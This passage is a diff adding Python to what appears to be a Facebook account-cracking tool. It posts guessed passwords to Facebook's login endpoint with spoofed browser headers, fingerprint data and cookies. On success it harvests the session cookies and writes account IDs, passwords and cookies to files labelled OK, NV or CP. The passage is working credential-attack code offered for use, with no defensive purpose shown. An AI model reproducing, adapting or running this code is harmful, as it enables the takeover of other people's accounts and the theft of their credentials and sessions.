tYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzMyNjM5MzQ1Ljk0OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTczMjYzOTM0NS44NDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTczMjYzOTM0NS44NDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg0OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzMyNjM5MzQ1Ljg2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3MzI2MzkzNDUuODYxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzMyNjM5MzQ1Ljg2MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo2fV0sIjMwMTA2IjpbeyJ0IjoxNzMyNjM5MzQ1LjczLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfSx7InQiOjE3MzI2MzkzNDcuMjc2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3MzI2MzkzNDUuNzMxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfV19',
+            'email': idff,
+            'prefill_contact_point': idff,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAA/A//A//ABAAC',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
+            cookies = {
+            'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
+            'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
+            'wd': '995x773',
+            'fr': '0c3x4NhqzBoN0oJpn.AWU6FQl4Gq0s9t7zOA_rFuUfdVo.BnPBZf..AAA.0.0.BnRfpx.AWUaeu38LkE',}
+            headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'priority': 'u=0, i',
+            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.86", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            'viewport-width': '995',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://www.facebook.com/login/device-based/regular/login/'
+            po = Session.post(url, cookies=cookies, headers=headers, data=data).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
+                    else:
+                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                        print(f" {green}Cookie : {green}{coki}")
+                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
                 open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
                 cps.append(uid)
                 break
